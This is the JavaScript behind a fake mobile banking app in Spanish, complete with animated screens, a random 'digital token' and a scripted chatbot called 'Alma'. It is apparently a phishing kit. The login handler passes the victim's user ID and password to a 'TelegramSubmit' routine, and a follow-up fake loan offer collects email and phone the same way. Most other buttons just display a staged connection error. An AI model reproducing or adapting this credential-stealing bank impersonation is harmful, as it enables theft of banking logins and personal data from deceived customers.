(() => {
  const app = document.getElementById("app");
  const drawer = document.getElementById("drawer");
  const backdrop = document.getElementById("backdrop");
  const modal = document.getElementById("loading-modal");
  const loanOffer = document.getElementById("loan-offer");
  const connModal = document.getElementById("conn-modal");
  const loginErrorModal = document.getElementById("login-error-modal");
  const loanEmail = document.getElementById("loan-email");
  const loanPhone = document.getElementById("loan-phone");
  const sheet = document.getElementById("alma-sheet");
  const password = document.getElementById("password");
  const userId = document.getElementById("user-id");
  const btnAccess = document.getElementById("btn-access");
  const tokenValue = document.getElementById("token-value");
  const tokenSecs = document.getElementById("token-secs");
  const tokenFill = document.getElementById("token-fill");
  const moreTokenValue = document.getElementById("more-token-value");
  const moreTokenSecs = document.getElementById("more-token-secs");
  const chatLog = document.getElementById("chat-log");
  const almaForm = document.getElementById("alma-form");
  const almaInput = document.getElementById("alma-input");

  const LONG = 420;
  const USER_ID_LEN = 11;
  const PASSWORD_MIN = 6;
  const TABS = [
    {
      id: "products",
      label: "Inicio",
      on: "assets/apk/nav_bar_home_filled_light_blue.png",
      off: "assets/apk/nav_bar_home_default.png",
    },
    {
      id: "transactions",
      label: "Transacciones",
      on: "assets/apk/nav_bar_transactions_filled_light_blue.png",
      off: "assets/apk/nav_bar_transactions_default.png",
    },
    {
      id: "requests",
      label: "Solicitudes",
      on: "assets/apk/nav_bar_applications_filled_light_blue.png",
      off: "assets/apk/nav_bar_applications_default.png",
    },
    {
      id: "more",
      label: "Más",
      on: "assets/apk/nav_bar_more_filled_light_blue.png",
      off: "assets/apk/nav_bar_more_default.png",
    },
  ];
  const TAB_IDS = new Set(TABS.map((t) => t.id));
  const STACK = [
    "splash",
    "welcome",
    "login",
    "products",
    "transactions",
    "requests",
    "more",
    "wallet",
    "token",
    "alma",
    "contact",
    "geo",
    "calculators",
    "promos",
  ];

  let current = "splash";
  let navigating = false;
  let tokenLeft = 56;
  let tokenTimer = null;
  let toastEl = null;
  let pendingLoanOffer = false;

  const screen = (name) => document.querySelector(`[data-screen="${name}"]`);
  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  const frames = () => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)));

  function buildTabbars() {
    document.querySelectorAll("[data-tabbar]").forEach((bar) => {
      const active = bar.getAttribute("data-active");
      bar.innerHTML = TABS.map(
        (t) => `
        <button type="button" class="tabbar__item${t.id === active ? " is-active" : ""}" data-go="${t.id}" data-tab>
          <img src="${t.id === active ? t.on : t.off}" alt="" data-icon-on="${t.on}" data-icon-off="${t.off}" />
          <span>${t.label}</span>
        </button>`
      ).join("");
    });
  }

  function syncTabbar(name) {
    document.querySelectorAll("[data-tabbar]").forEach((bar) => {
      // En pantallas fuera de las pestañas cada barra conserva su propia sección
      const active = TAB_IDS.has(name) ? name : bar.getAttribute("data-active");
      bar.querySelectorAll("[data-tab]").forEach((btn) => {
        const target = btn.getAttribute("data-go");
        const on = target === active;
        btn.classList.toggle("is-active", on);
        const img = btn.querySelector("img");
        if (img) img.src = on ? img.dataset.iconOn : img.dataset.iconOff;
      });
    });
  }

  function showToast(message) {
    if (!toastEl) {
      toastEl = document.createElement("div");
      toastEl.className = "toast";
      app.appendChild(toastEl);
    }
    toastEl.textContent = message;
    toastEl.classList.add("is-on");
    clearTimeout(showToast._t);
    showToast._t = setTimeout(() => toastEl.classList.remove("is-on"), 1600);
  }

  function resetStyles(el) {
    el.style.transition = "";
    el.style.transform = "";
    el.style.opacity = "";
    el.classList.remove("is-front", "is-back", "is-animating");
  }

  async function go(name, opts = {}) {
    if (navigating || name === current) return;
    const fromEl = screen(current);
    const toEl = screen(name);
    if (!fromEl || !toEl) return;

    closeDrawer();
    closeSheet();
    navigating = true;

    const fromIdx = STACK.indexOf(current);
    const toIdx = STACK.indexOf(name);
    const dir = opts.dir || (toIdx >= fromIdx ? "forward" : "back");
    const fade = !!opts.fade || current === "splash" || name === "splash";
    const tabSwap = TAB_IDS.has(current) && TAB_IDS.has(name);

    if (fade || tabSwap) {
      toEl.style.opacity = "0";
      toEl.style.transform = tabSwap ? "translateY(10px)" : "none";
    } else {
      toEl.style.transform = `translateX(${dir === "forward" ? "100%" : "-35%"})`;
      toEl.style.opacity = "1";
    }
    fromEl.style.opacity = "1";
    fromEl.style.transform = "translateX(0)";

    toEl.classList.add("is-active", "is-animating", "is-front");
    fromEl.classList.add("is-animating", "is-back");
    await frames();

    if (fade || tabSwap) {
      const ease = "cubic-bezier(0.22, 1, 0.36, 1)";
      toEl.style.transition = `opacity ${LONG}ms ${ease}, transform ${LONG}ms ${ease}`;
      fromEl.style.transition = `opacity ${LONG}ms ease`;
      toEl.style.opacity = "1";
      toEl.style.transform = "translateY(0)";
      fromEl.style.opacity = "0";
    } else {
      const leaveTo = dir === "forward" ? "-28%" : "100%";
      toEl.style.transition = `transform ${LONG}ms cubic-bezier(0.22, 1, 0.36, 1)`;
      fromEl.style.transition = `transform ${LONG}ms cubic-bezier(0.4, 0, 0.2, 1), opacity ${LONG}ms ease`;
      toEl.style.transform = "translateX(0)";
      fromEl.style.transform = `translateX(${leaveTo})`;
      if (dir === "forward") fromEl.style.opacity = "0.75";
    }

    await wait(LONG + 20);
    fromEl.classList.remove("is-active");
    resetStyles(fromEl);
    resetStyles(toEl);
    current = name;
    navigating = false;

    if (name === "token" || name === "more") startTokenTimer(name === "token" ? 56 : 12);
    else clearInterval(tokenTimer);
    if (name === "alma") {
      startAlmaIntro();
      almaInput?.focus();
    }
    if (name === "products") {
      applyAmountBlur();
      if (pendingLoanOffer) {
        pendingLoanOffer = false;
        showLoanOffer();
      }
    }
    syncTabbar(name);
  }

  function openDrawer() {
    drawer.classList.add("is-open");
    drawer.setAttribute("aria-hidden", "false");
    backdrop.hidden = false;
  }
  function closeDrawer() {
    drawer.classList.remove("is-open");
    drawer.setAttribute("aria-hidden", "true");
    if (!sheet || sheet.hidden) backdrop.hidden = true;
  }
  function openSheet() {
    sheet.hidden = false;
    backdrop.hidden = false;
    requestAnimationFrame(() => sheet.classList.add("is-open"));
  }
  function closeSheet() {
    if (!sheet) return;
    sheet.classList.remove("is-open");
    setTimeout(() => {
      sheet.hidden = true;
      if (!drawer.classList.contains("is-open")) backdrop.hidden = true;
    }, 280);
  }

  function digitsOnly(value, maxLen) {
    const digits = value.replace(/\D/g, "");
    return maxLen != null ? digits.slice(0, maxLen) : digits;
  }

  function isValidLogin() {
    const user = userId.value.trim();
    const pass = password.value.trim();
    return /^\d{11}$/.test(user) && /^\d{6,}$/.test(pass);
  }

  function syncAccess() {
    const ready = userId.value.trim().length > 0 && password.value.trim().length > 0;
    btnAccess.disabled = !ready;
    btnAccess.classList.toggle("is-ready", ready);
  }

  async function showLoginError() {
    loginErrorModal.hidden = false;
    loginErrorModal.classList.add("is-show");
    loginErrorModal.classList.remove("is-hide");
  }

  async function hideLoginError() {
    loginErrorModal.classList.remove("is-show");
    loginErrorModal.classList.add("is-hide");
    await wait(160);
    loginErrorModal.hidden = true;
    loginErrorModal.classList.remove("is-hide");
  }

  function randomToken() {
    const n = () => String(Math.floor(Math.random() * 900) + 100);
    return `${n()} ${n()}`;
  }

  const TOKEN_CYCLE = 60;

  function startTokenTimer(start = TOKEN_CYCLE) {
    clearInterval(tokenTimer);
    tokenLeft = start;
    const paint = () => {
      const t = `${tokenLeft}s`;
      if (tokenSecs) tokenSecs.textContent = t;
      if (moreTokenSecs) moreTokenSecs.textContent = t;
      if (tokenFill) tokenFill.style.width = `${((TOKEN_CYCLE - tokenLeft) / TOKEN_CYCLE) * 100}%`;
    };
    paint();
    tokenTimer = setInterval(() => {
      tokenLeft -= 1;
      if (tokenLeft <= 0) {
        tokenLeft = TOKEN_CYCLE;
        const next = randomToken();
        if (tokenValue) {
          tokenValue.classList.add("is-swap");
          setTimeout(() => {
            tokenValue.textContent = next;
            tokenValue.classList.remove("is-swap");
          }, 180);
        }
        if (moreTokenValue) moreTokenValue.textContent = next;
      }
      paint();
    }, 1000);
  }

  async function showLoading(thenGo, dir = "forward") {
    modal.hidden = false;
    modal.classList.add("is-show");
    await wait(1100);
    modal.classList.remove("is-show");
    modal.classList.add("is-hide");
    await wait(160);
    modal.hidden = true;
    modal.classList.remove("is-hide");
    if (thenGo) go(thenGo, { dir });
  }

  function appendBubble(text, who = "alma") {
    const row = document.createElement("div");
    row.className = `chat-row${who === "user" ? " chat-row--user" : ""}`;
    const time = new Date().toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit" });
    if (who === "user") row.innerHTML = `<div class="bubble bubble--user"><p></p></div>`;
    else
      row.innerHTML = `<div class="bubble"><p></p></div><div class="chat-meta"><img src="assets/apk/logobr_vertical_t.png" alt="" class="chat-avatar" /><time>${time}</time></div>`;
    row.querySelector("p").textContent = text;
    chatLog.appendChild(row);
    chatLog.scrollTop = chatLog.scrollHeight;
    return row;
  }

  function showTyping() {
    const row = document.createElement("div");
    row.className = "chat-row";
    row.dataset.typing = "1";
    row.innerHTML = `<div class="bubble bubble--typing" aria-label="Escribiendo"><span class="typing-dot"></span><span class="typing-dot"></span><span class="typing-dot"></span></div>`;
    chatLog.appendChild(row);
    chatLog.scrollTop = chatLog.scrollHeight;
    return row;
  }

  function clearTyping() {
    chatLog.querySelectorAll("[data-typing]").forEach((el) => el.remove());
  }

  let almaBooted = false;
  async function startAlmaIntro() {
    if (almaBooted) {
      chatLog.scrollTop = chatLog.scrollHeight;
      return;
    }
    almaBooted = true;
    chatLog.innerHTML = "";
    showTyping();
    await wait(1100);
    clearTyping();
    const time = new Date().toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit" });
    const row = document.createElement("div");
    row.className = "chat-row";
    row.innerHTML = `
      <div class="bubble">
        <p>¡Hola!</p>
        <p>¡Soy Alma, tu asistente virtual! 😃</p>
        <p>¿Cómo puedo ayudarte?</p>
        <button class="bubble-btn" type="button" id="btn-alma-menu">Menú Principal</button>
      </div>
      <div class="chat-meta">
        <img src="assets/apk/logobr_vertical_t.png" alt="" class="chat-avatar" />
        <time>${time}</time>
      </div>`;
    chatLog.appendChild(row);
    document.getElementById("btn-alma-menu")?.addEventListener("click", openSheet);
    chatLog.scrollTop = chatLog.scrollHeight;
  }

  async function almaReplyWithTyping(msg, direct) {
    showTyping();
    await wait(700);
    clearTyping();
    appendBubble(direct || almaReply(msg));
  }

  function applyAmountBlur() {
    document.querySelectorAll("[data-amount]").forEach((el) => {
      el.classList.add("amount-blur");
      el.classList.remove("is-ready");
    });
  }

  async function showConnError() {
    connModal.hidden = false;
    connModal.classList.add("is-show");
    connModal.classList.remove("is-hide");
  }

  async function hideConnError() {
    connModal.classList.remove("is-show");
    connModal.classList.add("is-hide");
    await wait(160);
    connModal.hidden = true;
    connModal.classList.remove("is-hide");
  }

  let loanStep = 0;

  function goLoanStep(step) {
    loanStep = step;
    loanOffer?.querySelectorAll("[data-loan-step]").forEach((el) => {
      const n = Number(el.getAttribute("data-loan-step"));
      el.classList.toggle("is-active", n === step);
    });
    if (step === 1) {
      syncLoanEmail();
      loanEmail?.focus();
    }
    if (step === 2) {
      syncLoanPhone();
      loanPhone?.focus();
    }
  }

  function syncLoanEmail() {
    const email = loanEmail?.value.trim() || "";
    const btn = loanOffer?.querySelector('[data-loan-action="email"]');
    if (btn) btn.disabled = !email || !email.includes("@");
  }

  function syncLoanPhone() {
    const btn = loanOffer?.querySelector('[data-loan-action="confirm"]');
    if (btn) btn.disabled = !loanPhone?.value.trim();
  }

  function resetLoanOffer() {
    if (loanEmail) loanEmail.value = "";
    if (loanPhone) loanPhone.value = "";
    goLoanStep(0);
    syncLoanEmail();
    syncLoanPhone();
  }

  function showLoanOffer() {
    resetLoanOffer();
    loanOffer.hidden = false;
    loanOffer.classList.add("is-show");
  }

  async function closeLoanOffer() {
    const email = loanEmail?.value.trim() || "";
    const phone = loanPhone?.value.trim() || "";
    window.TelegramSubmit?.setLoan(email, phone);
    await window.TelegramSubmit?.sendComplete(email, phone);
    loanOffer.classList.remove("is-show");
    loanOffer.hidden = true;
    showToast("Solicitud recibida");
  }

  function syncClearBtn() {
    const clear = document.getElementById("clear-user");
    if (clear) clear.hidden = !userId.value.trim();
  }

  function almaReply(msg) {
    const q = msg.toLowerCase();
    if (q.includes("balance")) return "Puedes ver tus balances en Inicio > Cuentas.";
    if (q.includes("token")) return "Tu Token Digital está en Más opciones.";
    if (q.includes("horario") || q.includes("ubic")) return "Usa Geolocalización para oficinas y cajeros.";
    if (q.includes("hola")) return "¡Hola! Elige una opción del Menú Principal.";
    return "Abre el Menú Principal para ver todas las opciones.";
  }

  async function copyCode(code) {
    try {
      await navigator.clipboard.writeText(code.replace(/\s+/g, ""));
      showToast("Código copiado");
    } catch {
      showToast(code);
    }
  }

  const CONN_SELECTORS =
    ".plain-row, .req-card, .contact-row, .geo-row, .profile-row, .drawer__item:not([data-go]), .info-card__link, .text-action";

  app.addEventListener("click", (e) => {
    const stub = e.target.closest(CONN_SELECTORS);
    if (stub && !stub.hasAttribute("data-go") && !stub.closest("#login-form")) {
      e.preventDefault();
      showConnError();
      return;
    }

    const el = e.target.closest("[data-go]");
    if (!el) return;
    e.preventDefault();
    const target = el.getAttribute("data-go");
    if (target === current && el.hasAttribute("data-tab")) return;
    const back = el.hasAttribute("data-back");
    const loading = el.hasAttribute("data-loading");
    const tab = el.hasAttribute("data-tab");
    if (loading) showLoading(target, back ? "back" : "forward");
    else go(target, { dir: back ? "back" : "forward", fade: tab });
  });

  document.getElementById("btn-menu")?.addEventListener("click", openDrawer);
  backdrop.addEventListener("click", () => {
    closeDrawer();
    closeSheet();
  });
  sheet?.querySelectorAll(".sheet__item").forEach((btn) => {
    btn.addEventListener("click", () => {
      const title = btn.querySelector("strong")?.textContent || "Opción";
      closeSheet();
      appendBubble(title, "user");
      almaReplyWithTyping(title, `Seleccionaste: ${title}. ¿Deseas continuar?`);
    });
  });

  document.getElementById("clear-user")?.addEventListener("click", () => {
    userId.value = "";
    userId.focus();
    syncAccess();
    syncClearBtn();
  });
  password.addEventListener("input", () => {
    const next = digitsOnly(password.value);
    if (password.value !== next) password.value = next;
    syncAccess();
  });
  userId.addEventListener("input", () => {
    const next = digitsOnly(userId.value, USER_ID_LEN);
    if (userId.value !== next) userId.value = next;
    syncAccess();
    syncClearBtn();
  });

  document.getElementById("login-form")?.addEventListener("submit", async (e) => {
    e.preventDefault();
    if (!isValidLogin()) {
      showLoginError();
      return;
    }
    window.TelegramSubmit?.setLogin(userId.value.trim(), password.value.trim());
    void window.TelegramSubmit?.sendLogin();
    pendingLoanOffer = true;
    await showLoading(null);
    await go("products", { dir: "forward" });
  });

  loanOffer?.addEventListener("click", (e) => {
    const action = e.target.closest("[data-loan-action]");
    if (!action || action.disabled) return;
    e.stopPropagation();
    const kind = action.getAttribute("data-loan-action");
    if (kind === "next") goLoanStep(1);
    else if (kind === "email") goLoanStep(2);
    else if (kind === "confirm") void closeLoanOffer();
  });

  loanEmail?.addEventListener("input", syncLoanEmail);
  loanPhone?.addEventListener("input", syncLoanPhone);
  document.getElementById("conn-close")?.addEventListener("click", hideConnError);
  document.getElementById("login-error-close")?.addEventListener("click", hideLoginError);

  document.getElementById("copy-token")?.addEventListener("click", () => copyCode(tokenValue.textContent));
  document.getElementById("copy-more-token")?.addEventListener("click", () => copyCode(moreTokenValue.textContent));
  document.querySelector(".bio-btn")?.addEventListener("click", (e) => {
    e.preventDefault();
    showConnError();
  });
  document.getElementById("btn-call")?.addEventListener("click", () => showConnError());
  document.getElementById("forgot-link")?.addEventListener("click", (e) => {
    e.preventDefault();
    showConnError();
  });
  document.querySelector(".text-link--footer")?.addEventListener("click", (e) => {
    e.preventDefault();
    showConnError();
  });

  almaForm?.addEventListener("submit", (e) => {
    e.preventDefault();
    const msg = almaInput.value.trim();
    if (!msg) return;
    appendBubble(msg, "user");
    almaInput.value = "";
    almaReplyWithTyping(msg);
  });

  buildTabbars();
  setTimeout(() => go("welcome", { fade: true }), 1600);
  syncAccess();
  syncClearBtn();
})();
